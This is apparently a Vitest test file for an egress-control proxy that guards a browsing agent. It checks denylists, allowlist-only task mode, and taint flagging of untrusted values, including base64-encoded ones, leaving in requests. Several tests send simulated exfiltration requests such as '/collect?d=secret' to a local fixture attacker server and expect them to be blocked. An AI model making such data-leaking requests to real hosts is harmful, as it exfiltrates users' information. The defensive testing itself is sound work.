import { afterAll, beforeAll, describe, expect, it } from 'vitest';
import http from 'node:http';
import net from 'node:net';
import { EgressController, hostKey, startProxy, type EgressAuditEntry, type ProxyHandle } from '../../src/core/egress';
import { TaintRegistry } from '../../src/core/taint';
import { startFixtureServers, type FixtureServers } from '../helpers/fixture-server';

let fx: FixtureServers;
let proxy: ProxyHandle;
const log: EgressAuditEntry[] = [];
const ctl = new EgressController(['denied.example'], (e) => log.push(e));

beforeAll(async () => {
  fx = await startFixtureServers();
  proxy = await startProxy(ctl);
});
afterAll(async () => {
  await proxy.close();
  await fx.close();
});

function viaProxy(url: string): Promise<number> {
  return new Promise((resolve, reject) => {
    const req = http.request({ host: '127.0.0.1', port: proxy.port, path: url, method: 'GET', headers: { host: new URL(url).host } }, (res) => {
      res.resume();
      res.on('end', () => resolve(res.statusCode ?? 0));
    });
    req.on('error', reject);
    req.end();
  });
}

function connectViaProxy(target: string): Promise<string> {
  return new Promise((resolve) => {
    const s = net.connect(proxy.port, '127.0.0.1', () => s.write(`CONNECT ${target} HTTP/1.1\r\nHost: ${target}\r\n\r\n`));
    s.once('data', (d) => {
      resolve(d.toString().split('\r\n')[0]);
      s.destroy();
    });
  });
}

describe('host keys', () => {
  it('include the port, with defaults', () => {
    expect(hostKey('http://127.0.0.1:4001/x')).toBe('127.0.0.1:4001');
    expect(hostKey('https://Example.com/')).toBe('example.com:443');
    expect(hostKey('example.com:8080')).toBe('example.com:8080');
  });
});

describe('egress proxy', () => {
  it('manual browsing: log-only (allowed), denylist blocks', async () => {
    ctl.endTask();
    expect(await viaProxy(`${fx.attacker}/manual`)).toBe(200);
    expect(fx.attackerHits.some((h) => h.url === '/manual')).toBe(true);
    expect(log.at(-1)).toMatchObject({ layer: 'proxy', decision: 'log' });
    expect(await viaProxy('http://denied.example/x')).toBe(403);
    expect(await connectViaProxy('ads.denied.example:443')).toMatch(/403/);
  });

  it('agent mode: only allowlisted host:port pass, others are blocked and counted', async () => {
    ctl.startTask([fx.site], new TaintRegistry('t'));
    expect(await viaProxy(`${fx.site}/shop.html`)).toBe(200);
    const before = fx.attackerHits.length;
    expect(await viaProxy(`${fx.attacker}/collect?d=secret`)).toBe(403);
    expect(await viaProxy(`${fx.attacker}/collect?d=secret2`)).toBe(403);
    expect(fx.attackerHits.length).toBe(before);
    expect(ctl.blockedHosts()).toEqual([{ host: hostKey(fx.attacker), count: 2 }]);
    expect(log.at(-1)).toMatchObject({ layer: 'proxy', decision: 'block', host: hostKey(fx.attacker) });
    // same hostname, different port is a different host
    const otherPort = fx.site.replace(/:\d+$/, ':9');
    expect(ctl.decideHost(hostKey(otherPort)!, 'GET')).toBe(false);
  });

  it('CONNECT is decided on host:port only', async () => {
    ctl.startTask(['https://allowed.test'], new TaintRegistry('t'));
    expect(await connectViaProxy('blocked.test:443')).toMatch(/403/);
  });

  it('"allow for this task" lets a blocked host through until the task ends', async () => {
    ctl.startTask([fx.site], new TaintRegistry('t'));
    ctl.allowHost(fx.attacker);
    expect(await viaProxy(`${fx.attacker}/allowed-now`)).toBe(200);
    ctl.endTask();
    ctl.startTask([fx.site], new TaintRegistry('t'));
    expect(await viaProxy(`${fx.attacker}/next-task`)).toBe(403);
  });
});

describe('egress content filter (webRequest layer logic)', () => {
  it('flags tainted values in URL or body unless the flow was confirmed for that host', () => {
    const taint = new TaintRegistry('t');
    ctl.startTask([fx.site], taint);
    const v = taint.register('WINTER-SALE-7731', 'untrusted', [{ source: 'reader', timestamp: 't' }]);
    const u = `${fx.site}/search?q=winter-sale-7731`;
    expect(ctl.checkRequest(u, 'GET').unconfirmed.map((x) => x.id)).toEqual([v.id]);
    expect(ctl.checkRequest(`${fx.site}/p`, 'POST', `c=${Buffer.from('WINTER-SALE-7731').toString('base64')}`).unconfirmed).toHaveLength(1);
    ctl.confirmFlow([v.id], fx.site);
    expect(ctl.checkRequest(u, 'GET').unconfirmed).toHaveLength(0);
    expect(ctl.checkRequest(`${fx.attacker}/x?q=WINTER-SALE-7731`, 'GET').unconfirmed).toHaveLength(1);
    const e = log.filter((x) => x.layer === 'webrequest').at(-1)!;
    expect(e.taintIds).toEqual([v.id]);
  });
  it('is log-only in manual mode', () => {
    ctl.endTask();
    expect(ctl.checkRequest(`${fx.attacker}/x?q=WINTER-SALE-7731`, 'GET').unconfirmed).toHaveLength(0);
  });
});
